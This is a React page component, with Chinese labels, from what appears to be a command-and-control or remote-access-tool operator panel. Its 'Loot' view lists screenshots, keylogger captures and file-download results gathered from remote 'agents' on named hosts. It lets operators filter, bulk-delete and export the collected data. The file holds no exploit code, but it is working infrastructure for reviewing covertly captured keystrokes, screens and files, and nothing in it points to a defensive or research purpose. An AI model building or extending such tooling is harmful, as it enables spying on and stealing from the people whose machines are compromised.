"use client";

import { useEffect, useState, useCallback } from "react";
import { API_BASE } from "@/lib/constants";
import { ConfirmModal, PageHeader, SearchInput, Pagination } from "@/components/UI";

interface Screenshot {
  id: string;
  agent_id: string;
  filename: string;
  path: string;
  created_at: string;
}

interface KeylogTask {
  id: string;
  agent_id: string;
  hostname?: string;
  agent?: { hostname: string };
  result: string;
  error: string;
  status: string;
  created_at: string;
}

interface DownloadTask {
  id: string;
  agent_id: string;
  hostname?: string;
  agent?: { hostname: string };
  command: string;
  result: string;
  status: string;
  created_at: string;
}

interface LootData {
  screenshots: Screenshot[];
  keylog_tasks: KeylogTask[];
  download_tasks: DownloadTask[];
}

type LootTab = "screenshots" | "keylogs" | "downloads";


export default function LootPage() {
  const [data, setData] = useState<LootData | null>(null);
  const [loading, setLoading] = useState(true);
  const [modalImg, setModalImg] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<LootTab>("screenshots");
  const [agentFilter, setAgentFilter] = useState("");
  const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
  const [cfm, setCfm] = useState<{msg: string; cb: () => void} | null>(null);

  const loadLoot = useCallback(async () => {
    setLoading(true);
    try {
      const res = await fetch(`${API_BASE}?p=/loot&format=json`);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const result = await res.json();
      setData({
        screenshots: result.Screenshots || result.screenshots || [],
        keylog_tasks: result.KeylogTasks || result.Keylogs || result.keylog_tasks || result.keylogs || [],
        download_tasks: result.DownloadTasks || result.Downloads || result.download_tasks || result.downloads || [],
      });
    } catch {
      setData({ screenshots: [], keylog_tasks: [], download_tasks: [] });
    }
    setLoading(false);
  }, []);

  useEffect(() => { Promise.resolve().then(() => loadLoot()); }, [loadLoot]);

  const filteredScreenshots = data?.screenshots?.filter(s => !agentFilter || s.agent_id === agentFilter) || [];
  const filteredKeylogs = data?.keylog_tasks?.filter(k => !agentFilter || k.agent_id === agentFilter) || [];
  const filteredDownloads = data?.download_tasks?.filter(d => !agentFilter || d.agent_id === agentFilter) || [];

  const allAgents = [...new Set([
    ...(data?.screenshots?.map(s => s.agent_id) || []),
    ...(data?.keylog_tasks?.map(k => k.agent_id) || []),
    ...(data?.download_tasks?.map(d => d.agent_id) || []),
  ])];

  const toggleSelect = (id: string) => {
    const next = new Set(selectedItems);
    if (next.has(id)) next.delete(id); else next.add(id);
    setSelectedItems(next);
  };

  const toggleSelectAll = () => {
    let items: string[] = [];
    if (activeTab === "screenshots") items = filteredScreenshots.map(s => s.id);
    else if (activeTab === "keylogs") items = filteredKeylogs.map(k => k.id);
    else items = filteredDownloads.map(d => d.id);
    const allSelected = items.every(id => selectedItems.has(id));
    const next = new Set(selectedItems);
    if (allSelected) items.forEach(id => next.delete(id));
    else items.forEach(id => next.add(id));
    setSelectedItems(next);
  };

  const deleteSelected = () => {
    if (selectedItems.size === 0) return;
    setCfm({msg: `确定删除选中的 ${selectedItems.size} 个条目？`, cb: async () => {
      try {
        await fetch(`${API_BASE}?p=/loot/bulk-delete`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ ids: [...selectedItems] }),
        });
        setSelectedItems(new Set());
        loadLoot();
      } catch (e) { console.error("Loot: delete items failed", e); }
    }});
  };

  const exportAll = () => {
    const exportData = {
      screenshots: filteredScreenshots,
      keylogs: filteredKeylogs,
      downloads: filteredDownloads,
    };
    const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `loot-export-${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const formatTime = (t: string) => {
    if (!t) return "-";
    try { return new Date(t).toLocaleString(); } catch { return t; }
  };

  const formatBytes = (str: string) => {
    const size = (str || "").length;
    if (size < 1024) return size + " B";
    return (size / 1024).toFixed(1) + " KB";
  };

  const tabs: { key: LootTab; label: string; icon: string; count: number }[] = [
    { key: "screenshots", label: "截图", icon: "fa-images", count: filteredScreenshots.length },
    { key: "keylogs", label: "键盘记录", icon: "fa-keyboard", count: filteredKeylogs.length },
    { key: "downloads", label: "文件下载", icon: "fa-download", count: filteredDownloads.length },
  ];

  return (
    <div className="max-w-7xl mx-auto mb-20 md:mb-0">
      <PageHeader title={<>截图收集 <span className="text-amber-500">Loot</span></>} subtitle="管理所有截图、键盘记录、下载的文件等收集品">
        <div className="flex items-center gap-2 flex-wrap">
          <select value={agentFilter} onChange={e => { setAgentFilter(e.target.value); setSelectedItems(new Set()); }}
            className="ui-card px-3 py-2 text-sm focus:outline-none focus:border-indigo-500 dark:text-slate-100">
            <option value="">全部 Agent</option>
            {allAgents.map(a => (
              <option key={a} value={a}>{a.substring(0, 12)}</option>
            ))}
          </select>
          <button onClick={exportAll} className="px-4 py-2 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-sm font-medium transition-colors">
            <i className="fa-solid fa-file-export mr-1"></i>导出全部
          </button>
          {selectedItems.size > 0 && (
            <button onClick={deleteSelected} className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-xl text-sm font-medium transition-colors">
              <i className="fa-solid fa-trash mr-1"></i>删除选中 ({selectedItems.size})
            </button>
          )}
        </div>
      </PageHeader>

      <div className="flex border-b border-[var(--border)] mb-4">
        {tabs.map(t => (
          <button key={t.key} onClick={() => { setActiveTab(t.key); setSelectedItems(new Set()); }}
            className={`flex items-center gap-x-2 px-5 py-3 text-sm font-medium border-b-2 transition-colors ${activeTab === t.key ? "border-indigo-500 text-indigo-600 dark:text-indigo-400" : "border-transparent text-slate-500 dark:text-slate-400 hover:text-slate-700 dark:hover:text-slate-300"}`}>
            <i className={`fa-solid ${t.icon}`}></i>
            <span>{t.label}</span>
            <span className={`text-xs px-1.5 py-0.5 rounded-full ${activeTab === t.key ? "bg-indigo-100 text-indigo-600 dark:bg-indigo-900/30 dark:text-indigo-400" : "bg-slate-100 text-slate-500 dark:bg-slate-700 dark:text-slate-400"}`}>{t.count}</span>
          </button>
        ))}
      </div>

      {activeTab === "screenshots" && (
        <div className="ui-card rounded-3xl p-6">
          <div className="flex items-center justify-between mb-4">
            <div className="font-semibold text-slate-900 dark:text-slate-100 flex items-center gap-x-2">
              <i className="fa-solid fa-images text-purple-500"></i>
              <span>截图库</span>
            </div>
            <div className="flex items-center gap-3">
              {filteredScreenshots.length > 0 && (
                <label className="flex items-center gap-x-2 text-xs text-slate-500 cursor-pointer">
                  <input type="checkbox" checked={filteredScreenshots.length > 0 && filteredScreenshots.every(s => selectedItems.has(s.id))} onChange={toggleSelectAll} className="rounded border-[var(--border)] text-indigo-600" />
                  全选                </label>
              )}
              <span className="text-xs text-slate-400 dark:text-slate-500">{filteredScreenshots.length} </span>
            </div>
          </div>
          {loading ? (
            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-2">
              {Array.from({ length: 8 }).map((_, i) => (
                <div key={i} className="rounded-xl border border-[var(--border)] bg-slate-100 dark:bg-slate-700/50 h-24 animate-pulse"></div>
              ))}
            </div>
          ) : filteredScreenshots.length > 0 ? (
            <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 xl:grid-cols-8 gap-3">
              {filteredScreenshots.map(s => (
                <div key={s.id} className={`group relative rounded-xl overflow-hidden border-2 cursor-pointer bg-slate-50 dark:bg-slate-700/30 ${selectedItems.has(s.id) ? "border-indigo-500 ring-2 ring-indigo-200 dark:ring-indigo-800" : "border-[var(--border)]"}`}
                  onClick={() => setModalImg(`/screenshots/${s.path}`)}>
                  <div className="absolute top-1.5 left-1.5 z-10" onClick={e => { e.stopPropagation(); toggleSelect(s.id); }}>
                    <div className={`w-5 h-5 rounded border-2 flex items-center justify-center transition-colors ${selectedItems.has(s.id) ? "bg-indigo-500 border-indigo-500" : "bg-white/80 border-slate-300"}`}>
                      {selectedItems.has(s.id) && <i className="fa-solid fa-check text-white text-[10px]"></i>}
                    </div>
                  </div>
                  <img src={`/screenshots/${s.path}`} alt={s.filename} className="w-full h-24 object-contain bg-white dark:bg-slate-900" loading="lazy" />
                  <div className="absolute bottom-0 left-0 right-0 bg-black/60 text-[10px] text-white px-2 py-1 opacity-0 group-hover:opacity-100 transition flex justify-between items-center">
                    <span className="truncate">{s.agent_id.substring(0, 8)}</span>
                    <a href={`/screenshots/${s.path}`} download onClick={e => e.stopPropagation()} className="hover:text-emerald-300 px-1"><i className="fa-solid fa-download"></i></a>
                  </div>
                </div>
              ))}
            </div>
          ) : (
            <div className="text-center py-12 text-slate-400 dark:text-slate-500">
              <i className="fa-solid fa-images text-4xl mb-3 text-slate-300 dark:text-slate-600"></i>
              <p className="text-sm">暂无截图</p>
            </div>
          )}
        </div>
      )}

      {activeTab === "keylogs" && (
        <div className="ui-card rounded-3xl p-6">
          <div className="flex items-center justify-between mb-4">
            <div className="font-semibold text-slate-900 dark:text-slate-100 flex items-center gap-x-2">
              <i className="fa-solid fa-keyboard text-emerald-500"></i>
              <span>键盘记录存储</span>
            </div>
            <span className="text-xs text-slate-400 dark:text-slate-500">{filteredKeylogs.length} </span>
          </div>
          {loading ? (
            <div className="space-y-3">
              {[1, 2].map(i => (
                <div key={i} className="border border-[var(--border)] rounded-2xl p-4 animate-pulse">
                  <div className="h-3 bg-slate-200 dark:bg-slate-700 rounded w-32 mb-2"></div>
                  <div className="h-20 bg-slate-200 dark:bg-slate-700 rounded"></div>
                </div>
              ))}
            </div>
          ) : filteredKeylogs.length > 0 ? (
            <div className="space-y-3">
              {filteredKeylogs.map(k => {
                const agentName = k.agent?.hostname || k.hostname || k.agent_id;
                const initial = k.result ? k.result.substring(0, 200) : "";
                const full = k.result || k.error;
                const isExpanded = selectedItems.has(k.id);
                return (
                  <div key={k.id} className="border border-[var(--border)] rounded-2xl overflow-hidden">
                    <div className="flex justify-between items-center px-4 py-2 bg-slate-50 dark:bg-slate-700/30 border-b border-slate-100 dark:border-slate-700">
                      <div className="flex items-center gap-x-3">
                        <i className="fa-solid fa-terminal text-emerald-500 text-xs"></i>
                        <span className="font-medium text-sm text-slate-900 dark:text-slate-100">{agentName}</span>
                      </div>
                      <div className="flex items-center gap-x-3">
                        <span className="text-xs text-slate-400">{formatTime(k.created_at)}</span>
                        <button onClick={() => toggleSelect(k.id)} className="text-xs text-indigo-500 hover:text-indigo-600">
                          {isExpanded ? "收起" : "展开"}
                        </button>
                      </div>
                    </div>
                    <div className={`bg-slate-900 text-emerald-300 font-mono text-xs ${isExpanded ? "p-4 max-h-[500px]" : "px-4 py-3 max-h-32"} overflow-y-auto whitespace-pre-wrap break-all`}>
                      {isExpanded ? full : initial}
                      {!isExpanded && full.length > 200 && <span className="text-emerald-500 ml-1">... (可展开)</span>}
                    </div>
                  </div>
                );
              })}
            </div>
          ) : (
            <div className="text-center py-12 text-slate-400 dark:text-slate-500">
              <i className="fa-solid fa-keyboard text-4xl mb-3 text-slate-300 dark:text-slate-600"></i>
              <p className="text-sm">暂无键盘记录</p>
            </div>
          )}
        </div>
      )}

      {activeTab === "downloads" && (
        <div className="ui-card rounded-3xl p-6">
          <div className="flex items-center justify-between mb-4">
            <div className="font-semibold text-slate-900 dark:text-slate-100 flex items-center gap-x-2">
              <i className="fa-solid fa-download text-blue-500"></i>
              <span>文件导入导出</span>
            </div>
            <span className="text-xs text-slate-400 dark:text-slate-500">{filteredDownloads.length} </span>
          </div>
          {loading ? (
            <div className="space-y-2">
              {[1, 2, 3].map(i => (
                <div key={i} className="h-10 bg-slate-100 dark:bg-slate-700/50 rounded animate-pulse"></div>
              ))}
            </div>
          ) : filteredDownloads.length > 0 ? (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="text-left text-xs text-slate-500 dark:text-slate-400 border-b border-[var(--border)]">
                    <th className="py-2 pr-4 min-w-[140px]">时间</th>
                    <th className="py-2 pr-4 min-w-[150px]">文件/路径</th>
                    <th className="py-2 pr-4 min-w-[200px]">来源</th>
                    <th className="py-2 pr-4 min-w-[80px]">大小</th>
                    <th className="py-2 min-w-[80px]">状态</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-100 dark:divide-slate-700">
                  {filteredDownloads.map(d => (
                    <tr key={d.id} className="hover:bg-slate-50 dark:hover:bg-slate-700/50">
                      <td className="py-3 pr-4 font-mono text-xs text-slate-500 dark:text-slate-400">{formatTime(d.created_at)}</td>
                      <td className="py-3 pr-4">
                        <span className="font-medium text-slate-900 dark:text-slate-100 text-xs">{d.agent?.hostname || d.hostname || d.agent_id.substring(0, 8)}</span>
                      </td>
                      <td className="py-3 pr-4 font-mono text-xs text-slate-500 max-w-[200px] truncate">{d.command}</td>
                      <td className="py-3 pr-4 font-mono text-xs text-slate-500 max-w-[300px] truncate">{d.result || "-"}</td>
                      <td className="py-3 pr-4 text-xs text-slate-500">{formatBytes(d.result || "")}</td>
                      <td className="py-3">
                        <span className={`text-[10px] px-2 py-0.5 rounded-full font-medium ${d.status === "completed" ? "bg-emerald-100 text-emerald-700 dark:bg-emerald-900/30 dark:text-emerald-400" : d.status === "pending" ? "bg-amber-100 text-amber-700 dark:bg-amber-900/30 dark:text-amber-400" : "bg-slate-100 text-slate-600 dark:bg-slate-700 dark:text-slate-400"}`}>{d.status}</span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          ) : (
            <div className="text-center py-12 text-slate-400 dark:text-slate-500">
              <i className="fa-solid fa-download text-4xl mb-3 text-slate-300 dark:text-slate-600"></i>
              <p className="text-sm">暂无下载记录</p>
            </div>
          )}
        </div>
      )}

      {modalImg && (
        <div className="fixed inset-0 bg-black/90 z-[100] flex items-center justify-center p-4" onClick={() => setModalImg(null)}>
          <div className="absolute top-4 right-4 flex gap-2 z-10">
            <a href={modalImg} download className="px-3 py-2 bg-[var(--card-bg)] rounded-xl text-sm hover:bg-slate-100 dark:hover:bg-slate-700 transition-colors">
              <i className="fa-solid fa-download mr-1"></i>下载
            </a>
            <button onClick={() => setModalImg(null)} className="w-10 h-10 bg-[var(--card-bg)] rounded-xl hover:bg-slate-100 dark:hover:bg-slate-700 transition-colors flex items-center justify-center">
              <i className="fa-solid fa-xmark"></i>
            </button>
          </div>
          <img src={modalImg} alt="Screenshot" className="max-w-[95vw] max-h-[90vh] object-contain rounded-xl shadow-2xl" onClick={e => e.stopPropagation()} />
        </div>
      )}
      <ConfirmModal open={!!cfm} title="Confirm" message={cfm?.msg || ""} confirmText="Delete" cancelText="Cancel" danger onConfirm={() => { cfm?.cb(); setCfm(null); }} onCancel={() => setCfm(null)} />
    </div>
  );
}
